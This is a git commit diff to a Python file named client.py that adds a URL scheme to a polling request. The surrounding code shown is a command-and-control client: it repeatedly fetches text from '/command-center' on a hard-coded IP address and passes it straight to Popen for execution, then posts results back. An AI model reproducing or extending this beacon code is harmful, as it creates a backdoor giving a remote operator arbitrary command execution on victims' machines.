c65e060582a6e190183ff5361a6ecd5216797751
Venu2HD <83081969+Venu2HD@users.noreply.github.com>
2023-07-05 14:01:58 +0200

    added scheme

--- client.py
+++ client.py
@@ -5,11 +5,12 @@ from time import sleep
 DELAY = 5
 IP = "143.42.110.206"
 PORT = 80
+SCHEME = "http"
 
 
 def main() -> None:
     while True:
-        get_commands_response = get(f"{IP}:{PORT}/command-center")
+        get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
         if get_commands_response.status_code != 204:
             Popen(get_commands_response.text)
             post(
